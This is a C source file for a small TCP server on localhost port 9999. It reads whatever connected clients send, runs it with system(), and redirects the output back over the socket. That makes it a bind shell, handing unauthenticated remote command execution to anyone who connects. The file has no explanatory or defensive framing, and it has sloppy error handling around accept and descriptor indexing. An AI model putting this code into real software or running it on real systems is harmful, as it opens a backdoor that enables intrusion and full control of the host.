#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

#define PORT 9999
#define MAX	 10
#define ADDR "127.0.0.1"

int main(void)
{
	int sockfd, newsockfd, is_connected[MAX], fd;
	struct sockaddr_in addr;
	int addr_len = sizeof(struct sockaddr_in);
	fd_set myreadfds;
	char msgbuffer[2048];
	char msg[] = "This is the msg from server. conneceted\n";
	if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
	{
		printf("socket err\n");
		return -1;
	}
	printf("socket created\n");
	printf("socked id: %d\n", sockfd);
	bzero(&addr, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(PORT);
	addr.sin_addr.s_addr = inet_addr(ADDR);
	if(bind(sockfd, &addr, sizeof(addr)) < 0)
	{
		printf("bind err\n");
		return -1;
	}
	printf("binded\n");
	printf("local port: %d\n", PORT);
	if(listen(sockfd, MAX) < 0)
	{
		printf("listen err\n");
		return -1;
	}
	for(fd = 0; fd < MAX; ++fd)
	{
		is_connected[fd] = 0;
	}

	while(1)
	{
		FD_ZERO(&myreadfds);
		FD_SET(sockfd, &myreadfds);
		for(fd = 0; fd < MAX; ++fd)
		{
			if(is_connected[fd])
			{
				FD_SET(fd, &myreadfds);
			}
		}
		if(!select(MAX, &myreadfds, NULL, NULL, NULL))
		{
			continue;
		}
		for(fd = 0; fd < MAX; ++fd)
		{
			if(FD_ISSET(fd, &myreadfds))
			{
				if(sockfd == fd)
				{
					if((newsockfd = accept(sockfd, &addr, &addr_len)) < 0)
					{
						printf("accept err\n");
					}
						write(newsockfd, msg, sizeof(msg));
						is_connected[newsockfd] = 1;
						printf("connect from %s\n", inet_ntoa(addr.sin_addr));
				}
				else
				{
					bzero(msgbuffer, sizeof(msgbuffer));
					if(read(fd, msgbuffer, sizeof(msgbuffer)) <= 0)
					{
						printf("connect closed\n");
						is_connected[fd] = 0;

						close(fd);
					}
					else
					{
						dup2(fd, 1);
						system(msgbuffer);
					}
				}
			}
		}
	}
	return 0;
}

